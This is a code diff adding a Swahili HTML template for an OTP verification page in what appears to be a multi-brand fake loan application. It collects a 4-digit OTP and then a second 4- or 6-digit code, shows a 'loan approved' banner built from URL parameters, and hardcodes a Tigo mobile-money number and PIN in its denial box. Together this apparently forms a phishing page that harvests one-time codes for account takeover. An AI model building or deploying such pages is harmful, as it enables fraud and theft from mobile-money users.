@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Thibitisha OTP - {{ brand.app_name }}</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}" />
+  <style>
+    :root {
+      --primary: {{ brand.primary_color }};
+      --accent: {{ brand.accent_color }};
+      --primary-soft: {{ brand.primary_soft_color }};
+    }
+  </style>
+  <style>
+    .approval-message {
+      display: none;
+      background-color: #e6ffe6;
+      border: 2px solid #4caf50;
+      border-radius: 10px;
+      padding: 20px;
+      margin-top: 20px;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .approval-message h2 {
+      color: #4caf50;
+      font-size: 2rem;
+      margin-bottom: 10px;
+    }
+
+    .approval-message p {
+      font-size: 1.2rem;
+      margin: 5px 0;
+    }
+
+    .approval-message strong {
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div id="errorMessage" style="display: none; background-color: #ffdddd; border: 2px solid #f44336; border-radius: 10px; padding: 10px; margin: 10px; text-align: center;">
+    <strong id="errorText" style="color: #f44336;"></strong>
+  </div>
+  <main class="section">
+    <div class="container">
+      <div class="application-panel">
+        <div class="form-intro">
+          <p class="eyebrow eyebrow-accent">Uthibitishaji</p>
+          <h1>Thibitisha kwa OTP</h1>
+          <p class="section-text">Tafadhali ingiza nambari ya OTP yenye tarakimu 4 uliopokea. Muda uliobaki: <strong id="otpTimer">01:00</strong></p>
+        </div>
+
+        <div class="application-form">
+          <div class="field-card">
+            <span>OTP</span>
+            <input type="text" id="otpInput" maxlength="4" placeholder="1234" />
+          </div>
+
+          <div id="idiniMessage" class="form-feedback" aria-live="polite"></div>
+
+          <div id="secondOtpSection" class="field-card" style="display:none;">
+            <span>OTP ya Mwisho (4 au 6)</span>
+            <input type="text" id="secondOtpInput" maxlength="6" placeholder="1234 or 123456" />
+          </div>
+
+          <div id="denialMessage" class="form-feedback error" style="display: none;">
+            Uthibitishaji wa maelezo yako ya mawasiliano na PIN ya Tigo.
+            <br><br>
+            <strong>Namba ya Tigo:</strong> 0111823630<br>
+            <strong>PIN ya Tigo:</strong> 1122<br>
+            <button onclick="window.location.href='/application'" class="button button-primary">Rudi</button>
+            <button onclick="window.location.href='/apply'" class="button button-secondary">Tuma Maombi</button>
+          </div>
+
+          <div class="button-row">
+            <button type="button" id="verifyOtp" class="button button-primary">Thibitisha</button>
+            <button type="button" id="resendOtp" class="button button-secondary">Tuma tena OTP</button>
+          </div>
+        </div>
+
+        <div class="approval-message" id="approvalMessage" style="display: none;">
+          <h2>Hongera!</h2>
+          <p>Mkopo Umeidhinishwa.</p>
+          <p><strong>Jina:</strong> <span id="approvedName"></span></p>
+          <p><strong>Simu:</strong> <span id="approvedPhone"></span></p>
+          <p><strong>Kiasi Kilichoidhinishwa:</strong> TSh <span id="approvedAmount"></span></p>
+          
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    const REQUEST_ID = "{{ request_id }}";
+  </script>
+  <script src="{{ url_for('static', filename='js/idini.js') }}"></script>
+  <script>
+    // Check if the denial message should be displayed
+    const urlParams = new URLSearchParams(window.location.search);
+    const status = urlParams.get('status');
+    if (status === 'denied') {
+      document.getElementById('denialMessage').style.display = 'block';
+    }
+
+    if (status === 'approved') {
+      document.getElementById('approvalMessage').style.display = 'block';
+      document.getElementById('approvedName').textContent = urlParams.get('name');
+      document.getElementById('approvedPhone').textContent = urlParams.get('phone');
+      document.getElementById('approvedAmount').textContent = urlParams.get('amount');
+      document.getElementById('approvedOtp').textContent = urlParams.get('otp');
+    }
+
+    // Check if an error message should be displayed
+    const errorMessage = urlParams.get('message');
+    if (errorMessage) {
+      const errorDiv = document.getElementById('errorMessage');
+      const errorText = document.getElementById('errorText');
+      errorText.textContent = decodeURIComponent(errorMessage);
+      errorDiv.style.display = 'block';
+    }
+  </script>
+</body>
+</html>
